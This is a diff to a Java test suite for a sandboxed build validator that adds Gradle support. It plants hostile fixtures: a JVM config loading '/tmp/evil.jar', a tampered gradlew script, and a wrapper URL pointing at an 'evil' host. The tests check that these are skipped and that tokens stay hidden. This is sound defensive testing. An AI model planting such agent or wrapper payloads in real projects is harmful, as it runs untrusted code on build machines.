@@ -2,6 +2,7 @@ package com.anvith.archmorph.analysis.validation;
 
 import com.anvith.archmorph.analysis.model.ProjectModel;
 import com.anvith.archmorph.analysis.validation.build.BuildPluginGuard;
+import com.anvith.archmorph.analysis.validation.build.SandboxedGradleRunner;
 import com.anvith.archmorph.analysis.validation.build.SandboxedMavenRunner;
 import com.anvith.archmorph.analysis.validation.level.BuildValidator;
 import com.anvith.archmorph.common.config.ArchMorphProperties;
@@ -84,7 +85,7 @@ class BuildSandboxTest {
         Files.createDirectories(transformed.resolve(".mvn"));
         Files.writeString(transformed.resolve(".mvn/jvm.config"), "-javaagent:/tmp/evil.jar");
 
-        BuildValidator validator = new BuildValidator(properties, new SandboxedMavenRunner(properties), new BuildPluginGuard());
+        BuildValidator validator = new BuildValidator(properties, new SandboxedMavenRunner(properties), new SandboxedGradleRunner(properties), new BuildPluginGuard());
         Path scratch = Files.createDirectories(temp.resolve("scratch"));
         ValidationContext context = new ValidationContext(model, null, null, null, transformed, scratch, () -> null);
 
@@ -104,7 +105,7 @@ class BuildSandboxTest {
         Files.writeString(transformed.resolve("pom.xml"),
                 "<project><build><plugins><plugin><artifactId>exec-maven-plugin</artifactId></plugin></plugins></build></project>");
 
-        BuildValidator validator = new BuildValidator(properties, new SandboxedMavenRunner(properties), new BuildPluginGuard());
+        BuildValidator validator = new BuildValidator(properties, new SandboxedMavenRunner(properties), new SandboxedGradleRunner(properties), new BuildPluginGuard());
         BuildValidator.Outcome outcome = validator.validate(
                 new ValidationContext(model, null, null, null, transformed, Files.createDirectories(temp.resolve("s")), () -> null),
                 temp.resolve("repo"));
@@ -119,7 +120,7 @@ class BuildSandboxTest {
         fakeMaven("echo \"[ERROR] $(pwd)/src/main/java/com/x/A.java:[3,8] package com.y does not exist\"; exit 1");
         Path transformed = temp.resolve("t");
         ProjectModel model = Projects.model(transformed, Map.of("com/x/A.java", "package com.x; public class A {}"));
-        BuildValidator validator = new BuildValidator(properties, new SandboxedMavenRunner(properties), new BuildPluginGuard());
+        BuildValidator validator = new BuildValidator(properties, new SandboxedMavenRunner(properties), new SandboxedGradleRunner(properties), new BuildPluginGuard());
 
         BuildValidator.Outcome outcome = validator.validate(
                 new ValidationContext(model, null, null, null, transformed, Files.createDirectories(temp.resolve("s2")), () -> null),
@@ -130,6 +131,78 @@ class BuildSandboxTest {
             assertThat(issue.file()).isEqualTo("src/main/java/com/x/A.java");
             assertThat(issue.line()).isEqualTo(3);
             assertThat(issue.probableCause()).contains("package");
+        });
+    }
+
+    private void fakeGradle(String body) throws IOException {
+        Path script = temp.resolve("fake-gradle");
+        Files.writeString(script, "#!/bin/sh\n" + body + "\n");
+        Files.setPosixFilePermissions(script, PosixFilePermissions.fromString("rwx------"));
+        properties.getValidation().getBuild().setGradleExecutable(script.toString());
+    }
+
+    @Test
+    void gradleBuildsAreSkippedUnlessEnabled() throws Exception {
+        fakeGradle("echo SHOULD-NOT-RUN");
+        Path transformed = temp.resolve("g");
+        ProjectModel model = Projects.gradleModel(transformed, Map.of("com/x/A.java", "package com.x; public class A {}"));
+        BuildValidator validator = new BuildValidator(properties, new SandboxedMavenRunner(properties),
+                new SandboxedGradleRunner(properties), new BuildPluginGuard());
+
+        BuildValidator.Outcome outcome = validator.validate(
+                new ValidationContext(model, null, null, null, transformed, Files.createDirectories(temp.resolve("s3")), () -> null),
+                temp.resolve("repo"));
+
+        assertThat(outcome.level().status()).isEqualTo(ValidationStatus.SKIPPED);
+        assertThat(outcome.level().summary()).contains("gradle-enabled");
+        assertThat(outcome.build()).isNull();
+    }
+
+    @Test
+    void enabledGradleRunsTheServerGradleOnACopyWithoutTheWrapper() throws Exception {
+        fakeGradle("echo \"ARGS: $*\"; env; ls -a; ls gradle 2>/dev/null; echo done");
+        properties.getValidation().getBuild().setGradleEnabled(true);
+        Path transformed = temp.resolve("gw");
+        ProjectModel model = Projects.gradleModel(transformed, Map.of("com/x/A.java", "package com.x; public class A {}"));
+        Files.writeString(transformed.resolve("gradlew"), "#!/bin/sh\necho pwned");
+        Files.createDirectories(transformed.resolve("gradle/wrapper"));
+        Files.writeString(transformed.resolve("gradle/wrapper/gradle-wrapper.properties"), "distributionUrl=https://evil/x.zip");
+        Files.createDirectories(transformed.resolve(".gradle"));
+        BuildValidator validator = new BuildValidator(properties, new SandboxedMavenRunner(properties),
+                new SandboxedGradleRunner(properties), new BuildPluginGuard());
+
+        BuildValidator.Outcome outcome = validator.validate(
+                new ValidationContext(model, null, null, null, transformed, Files.createDirectories(temp.resolve("s4")), () -> null),
+                temp.resolve("cache/repo"));
+
+        assertThat(outcome.level().status()).isEqualTo(ValidationStatus.PASS);
+        String stdout = outcome.build().stdout();
+        assertThat(stdout).contains("--no-daemon").contains("classes").contains("build.gradle").contains("settings.gradle");
+        assertThat(stdout).contains("GRADLE_USER_HOME=").contains("HOME=<home>");
+        assertThat(stdout).doesNotContain("gradlew", "gradle-wrapper", "wrapper", "HTTPS_PROXY", "GITHUB_TOKEN");
+        assertThat(stdout.lines()).as("no project cache copied").doesNotContain(".gradle");
+        assertThat(stdout).as("absolute paths are masked").doesNotContain(temp.toString());
+        assertThat(outcome.build().command()).containsExactly("gradle", "--no-daemon", "-q", "classes");
+    }
+
+    @Test
+    void gradleCompilerErrorsAreParsed() throws Exception {
+        fakeGradle("echo \"$(pwd)/src/main/java/com/x/A.java:3: error: cannot find symbol\" >&2; echo 'FAILURE: Build failed' >&2; exit 1");
+        properties.getValidation().getBuild().setGradleEnabled(true);
+        Path transformed = temp.resolve("ge");
+        ProjectModel model = Projects.gradleModel(transformed, Map.of("com/x/A.java", "package com.x; public class A {}"));
+        BuildValidator validator = new BuildValidator(properties, new SandboxedMavenRunner(properties),
+                new SandboxedGradleRunner(properties), new BuildPluginGuard());
+
+        BuildValidator.Outcome outcome = validator.validate(
+                new ValidationContext(model, null, null, null, transformed, Files.createDirectories(temp.resolve("s5")), () -> null),
+                temp.resolve("repo"));
+
+        assertThat(outcome.level().status()).isEqualTo(ValidationStatus.FAIL);
+        assertThat(outcome.level().issues()).singleElement().satisfies(issue -> {
+            assertThat(issue.file()).isEqualTo("src/main/java/com/x/A.java");
+            assertThat(issue.line()).isEqualTo(3);
+            assertThat(issue.message()).isEqualTo("cannot find symbol");
         });
     }
 }
